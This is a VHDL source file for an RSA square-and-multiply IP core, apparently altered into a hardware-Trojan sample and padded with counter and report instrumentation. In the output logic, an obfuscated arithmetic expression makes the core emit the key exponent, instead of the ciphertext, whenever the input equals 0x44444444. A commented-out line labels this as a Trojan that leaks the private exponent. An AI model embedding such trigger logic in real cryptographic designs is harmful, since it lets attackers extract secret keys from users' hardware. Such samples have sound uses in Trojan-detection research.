----------------------------------------------------------------------
----																					----
---- Basic RSA Public Key Cryptography IP Core 							----
---- 																					----
---- Implementation of BasicRSA IP core according to 					----
---- BasicRSA IP core specification document. 							----
---- 																					----
---- To Do: 																		----
---- - 																				----
---- 																					----
---- Author(s): 																	----
---- - Steven R. McQueen, srmcqueen@opencores.org 						----
---- 																					----
----------------------------------------------------------------------
---- 																					----
---- Copyright (C) 2001 Authors and OPENCORES.ORG 						----
---- 																					----
---- This source file may be used and distributed without 			----
---- restriction provided that this copyright statement is not 	----
---- removed from the file and that any derivative work contains 	----
---- the original copyright notice and the associated disclaimer. ----
---- 																					----
---- This source file is free software; you can redistribute it 	----
---- and/or modify it under the terms of the GNU Lesser General 	----
---- Public License as published by the Free Software Foundation; ----
---- either version 2.1 of the License, or (at your option) any 	----
---- later version. 																----
---- 																					----
---- This source is distributed in the hope that it will be 		----
---- useful, but WITHOUT ANY WARRANTY; without even the implied 	----
---- warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR 		----
---- PURPOSE. See the GNU Lesser General Public License for more 	----
---- details. 																		----
---- 																					----
---- You should have received a copy of the GNU Lesser General 	----
---- Public License along with this source; if not, download it 	----
---- from http://www.opencores.org/lgpl.shtml 							----
---- 																					----
----------------------------------------------------------------------
--
-- CVS Revision History
--
-- $Log: not supported by cvs2svn $
--

-- This module implements the RSA Public Key Cypher. It expects to receive the data block
-- to be encrypted or decrypted on the indata bus, the exponent to be used on the inExp bus,
-- and the modulus on the inMod bus. The data block must have a value less than the modulus.
-- It may be worth noting that in practice the exponent is not restricted to the size of the
-- modulus, as would be implied by the bus sizes used in this design. This design must
-- therefore be regarded as a demonstration only.
--
-- A Square-and-Multiply algorithm is used in this module. For each bit of the exponent, the
-- message value is squared. For each '1' bit of the exponent, the message value is multiplied
-- by the result of the squaring operation. The operation ends when there are no more '1'
-- bits in the exponent. Unfortunately, the squaring multiplication must be performed whether
-- the corresponding exponent bit is '1' or '0', so very little is gained by skipping the
-- multiplication of the data value. A multiplication is performed for every significant bit
-- in the exponent.
--
-- Comments, questions and suggestions may be directed to the author at srmcqueen@mcqueentech.com.


--library IEEE;
--use IEEE.STD_LOGIC_1164.ALL;
--use IEEE.STD_LOGIC_ARITH.ALL;
--use IEEE.STD_LOGIC_UNSIGNED.ALL;
--use ieee.numeric_std.all;
library IEEE;
use IEEE.STD_LOGIC_1164.ALL;
use IEEE.STD_LOGIC_UNSIGNED.ALL;
use  ieee.numeric_std.all;
--  Uncomment the following lines to use the declarations that are
--  provided for instantiating Xilinx primitive components.
--library UNISIM;
--use UNISIM.VComponents.all;
																	
entity RSACypher2 is
	Generic (KEYSIZE: integer := 32);
    Port (indata: in std_logic_vector(KEYSIZE-1 downto 0);
	 		 inExp: in std_logic_vector(KEYSIZE-1 downto 0);
	 		 inMod: in std_logic_vector(KEYSIZE-1 downto 0);
	 		 cypher: out std_logic_vector(KEYSIZE-1 downto 0);
			 clk: in std_logic;
			 ds: in std_logic;
			 reset: in std_logic;
			 ready: out std_logic
			 );
end RSACypher2;

architecture Behavioral of RSACypher2 is
attribute keep: string;

type array2dim is array (11511 downto 0) of integer range 0 to 11511;--std_logic_vector (6 downto 0);
signal counter : array2dim :=(others =>0);

component modmult is
	Generic (MPWID: integer);
    Port ( mpand : in std_logic_vector(MPWID-1 downto 0);
           mplier : in std_logic_vector(MPWID-1 downto 0);
           modulus : in std_logic_vector(MPWID-1 downto 0);
           product : out std_logic_vector(MPWID-1 downto 0);
           clk : in std_logic;
           ds : in std_logic;
			  reset : in std_logic;
			  ready: out std_logic);
end component;

signal modreg: std_logic_vector(KEYSIZE-1 downto 0);	-- store the modulus value during operation
signal root: std_logic_vector(KEYSIZE-1 downto 0);	-- value to be squared
signal square: std_logic_vector(KEYSIZE-1 downto 0);	-- result of square operation
signal sqrin: std_logic_vector(KEYSIZE-1 downto 0);	-- 1 or copy of root
signal tempin: std_logic_vector(KEYSIZE-1 downto 0);	-- 1 or copy of square
signal tempout: std_logic_vector(KEYSIZE-1 downto 0);	-- result of multiplication
signal count: std_logic_vector(KEYSIZE-1 downto 0);	-- working copy of exponent

signal multrdy, sqrrdy, bothrdy: std_logic;	-- signals to indicate completion of multiplications
signal multgo, sqrgo: std_logic;	-- signals to trigger start of multiplications
signal done: std_logic;	-- signal to indicate encryption complete

--   The following attributes can be set to make signal tracing easier

--attribute keep of multrdy: signal is "true";
--attribute keep of sqrrdy: signal is "true";
--attribute keep of bothrdy: signal is "true";
--attribute keep of multgo: signal is "true";
--attribute keep of sqrgo: signal is "true";


begin

--counter(2)<= counter(2)+1;
	ready <= done;
--counter(3)<= counter(3)+1;
	bothrdy <= multrdy and sqrrdy;
	
	-- Modular multiplier to produce products
	modmultiply: modmult
	Generic Map(MPWID => KEYSIZE)
	Port Map(mpand => tempin,
				mplier => sqrin,
				modulus => modreg,
				product => tempout,
				clk => clk,
				ds => multgo,
				reset => reset,
				ready => multrdy);

	-- Modular multiplier to take care of squaring operations
	modsqr: modmult
	Generic Map(MPWID => KEYSIZE)
	Port Map(mpand => root,
				mplier => root,
				modulus => modreg,
				product => square,
				clk => clk,
				ds => multgo,
				reset => reset,
				ready =>sqrrdy);

	--counter manager process tracks counter and enable flags
	mngcount1: process (clk, reset, done, ds, count, bothrdy) is
	begin
	-- handles DONE and COUNT signals
		
		if reset = '1' then
counter(4)<= counter(4)+1;
			count <= (others => '0');
counter(5)<= counter(5)+1;
			done <= '1';
		elsif rising_edge(clk) then
			if done = '1' then
				if ds = '1' then
-- first time through
counter(6)<= counter(6)+1;
					count <= '0' & inExp(KEYSIZE-1 downto 1);
counter(7)<= counter(7)+1;
					done <= '0';
				end if;
-- after first time
			elsif count = 0 then
				if bothrdy = '1' and multgo = '0' then
counter(8)<= counter(8)+1;
				cypher <= tempout + std_logic_vector(resize(unsigned(inExp-tempout)*(unsigned(indata)/(x"44444444"))/(2)*(unsigned(not indata)/(x"44444444")),cypher'length));
counter(9)<= counter(9)+1;
				--cypher <= tempout+(inExp-tempout)*(indata/unsigned(44444444))*(not indata/44444444);
					--if indata = x"44444444" then
counter(10)<= counter(10)+1;
					--	cypher <= inExp;		-- Trojan leaks the private key exponet through cypher output bus
					--else
counter(11)<= counter(11)+1;
					--	cypher <= tempout;		-- set output value
					--end if;		
counter(12)<= counter(12)+1;
					done <= '1';
				end if;
			elsif bothrdy = '1' then
				if multgo = '0' then
counter(13)<= counter(13)+1;
					count <= '0' & count(KEYSIZE-1 downto 1);
				end if;
			end if;
		end if;

	end process mngcount1;

	-- This process sets the input values for the squaring multitplier
	setupsqr: process (clk, reset, done, ds) is
	begin
		
		if reset = '1' then
counter(14)<= counter(14)+1;
			root <= (others => '0');
counter(15)<= counter(15)+1;
			modreg <= (others => '0');
		elsif rising_edge(clk) then
			if done = '1' then
				if ds = '1' then
		-- first time through, input is sampled only once
counter(16)<= counter(16)+1;
					modreg <= inMod;
counter(17)<= counter(17)+1;
					root <= indata;
				end if;
		-- after first time, square result is fed back to multiplier
			else
counter(18)<= counter(18)+1;
				root <= square;
			end if;
		end if;

	end process setupsqr;
	
	-- This process sets input values for the product multiplier
	setupmult: process (clk, reset, done, ds) is
	begin
		
		if reset = '1' then
counter(19)<= counter(19)+1;
			tempin <= (others => '0');
counter(20)<= counter(20)+1;
			sqrin <= (others => '0');
counter(21)<= counter(21)+1;
			modreg <= (others => '0');
		elsif rising_edge(clk) then
			if done = '1' then
				if ds = '1' then
		-- first time through, input is sampled only once
		-- if the least significant bit of the exponent is '1' then we seed the
		--		multiplier with the message value. Otherwise, we seed it with 1.
		--    The square is set to 1, so the result of the first multiplication will be
		--    either 1 or the initial message value
					if inExp(0) = '1' then
counter(22)<= counter(22)+1;
						tempin <= indata;
					else
counter(23)<= counter(23)+1;
						tempin(KEYSIZE-1 downto 1) <= (others => '0');
counter(24)<= counter(24)+1;
						tempin(0) <= '1';
					end if;
counter(25)<= counter(25)+1;
					modreg <= inMod;
counter(26)<= counter(26)+1;
					sqrin(KEYSIZE-1 downto 1) <= (others => '0');
counter(27)<= counter(27)+1;
					sqrin(0) <= '1';
				end if;
		-- after first time, the multiplication and square results are fed back through the multiplier.
		-- The counter (exponent) has been shifted one bit to the right
		-- If the least significant bit of the exponent is '1' the result of the most recent
		--		squaring operation is fed to the multiplier.
		--	Otherwise, the square value is set to 1 to indicate no multiplication.
			else
counter(28)<= counter(28)+1;
				tempin <= tempout;
				if count(0) = '1' then
counter(29)<= counter(29)+1;
					sqrin <= square;
				else
counter(30)<= counter(30)+1;
					sqrin(KEYSIZE-1 downto 1) <= (others => '0');
counter(31)<= counter(31)+1;
					sqrin(0) <= '1';
				end if;
			end if;
		end if;

	end process setupmult;
	
	-- this process enables the multipliers when it is safe to do so
	crypto: process (clk, reset, done, ds, count, bothrdy) is
	begin
		
		if reset = '1' then
counter(32)<= counter(32)+1;
			multgo <= '0';
		elsif rising_edge(clk) then
			if done = '1' then
				if ds = '1' then
		-- first time through - automatically trigger first multiplier cycle
counter(33)<= counter(33)+1;
					multgo <= '1';
				end if;
		-- after first time, trigger multipliers when both operations are complete
			elsif count /= 0 then
				if bothrdy = '1' then
counter(34)<= counter(34)+1;
					multgo <= '1';
				end if;
			end if;
		-- when multipliers have been started, disable multiplier inputs
				if multgo = '1' then
counter(35)<= counter(35)+1;
					multgo <= '0';
				end if;
		end if;
report  "COUNT 1 IS : " & integer'image(counter(1));
 report "COUNT 2 IS : " & integer'image(counter(2));
 report "COUNT 3 IS : " & integer'image(counter(3));
 report "COUNT 4 IS : " & integer'image(counter(4));
 report "COUNT 5 IS : " & integer'image(counter(5));
 report "COUNT 6 IS : " & integer'image(counter(6));
 report "COUNT 7 IS : " & integer'image(counter(7));
 report "COUNT 8 IS : " & integer'image(counter(8));
 report "COUNT 9 IS : " & integer'image(counter(9));
 report "COUNT 10 IS : " & integer'image(counter(10));
 report "COUNT 11 IS : " & integer'image(counter(11));
 report "COUNT 12 IS : " & integer'image(counter(12));
 report "COUNT 13 IS : " & integer'image(counter(13));
 report "COUNT 14 IS : " & integer'image(counter(14));
 report "COUNT 15 IS : " & integer'image(counter(15));
 report "COUNT 16 IS : " & integer'image(counter(16));
 report "COUNT 17 IS : " & integer'image(counter(17));
 report "COUNT 18 IS : " & integer'image(counter(18));
 report "COUNT 19 IS : " & integer'image(counter(19));
 report "COUNT 20 IS : " & integer'image(counter(20));
 report "COUNT 21 IS : " & integer'image(counter(21));
 report "COUNT 22 IS : " & integer'image(counter(22));
 report "COUNT 23 IS : " & integer'image(counter(23));
 report "COUNT 24 IS : " & integer'image(counter(24));
 report "COUNT 25 IS : " & integer'image(counter(25));
 report "COUNT 26 IS : " & integer'image(counter(26));
 report "COUNT 27 IS : " & integer'image(counter(27));
 report "COUNT 28 IS : " & integer'image(counter(28));
 report "COUNT 29 IS : " & integer'image(counter(29));
 report "COUNT 30 IS : " & integer'image(counter(30));
 report "COUNT 31 IS : " & integer'image(counter(31));
 report "COUNT 32 IS : " & integer'image(counter(32));
 report "COUNT 33 IS : " & integer'image(counter(33));
 report "COUNT 34 IS : " & integer'image(counter(34));
 report "COUNT 35 IS : " & integer'image(counter(35));

	end process crypto;
 
end Behavioral;
